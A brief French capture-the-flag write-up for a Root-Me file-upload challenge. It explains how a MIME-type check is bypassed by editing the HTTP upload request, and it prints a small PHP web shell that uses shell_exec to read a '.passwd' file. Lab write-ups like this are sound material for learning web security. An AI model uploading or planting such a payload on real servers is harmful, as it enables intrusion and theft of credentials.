Le challenge : https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Type-MIME


Une autre faille dans l'upload ^^ mais qui requiert un peu de http ! 

Cette fois on peut envoyer le même fichier 

Mais cette fois via http on modifie la requete pour envoyer le php sans le .png 

ON ouvre notre image et hop !

Ou simplement on écrit dans le post 

notre script et en renseignant le file name

‘‘‘
filename="script.php"


<?php //exp.php.png 
$content = shell_exec('cat ../../../.passwd'); 
echo "<pre>$content</pre>"; 
?>
‘‘‘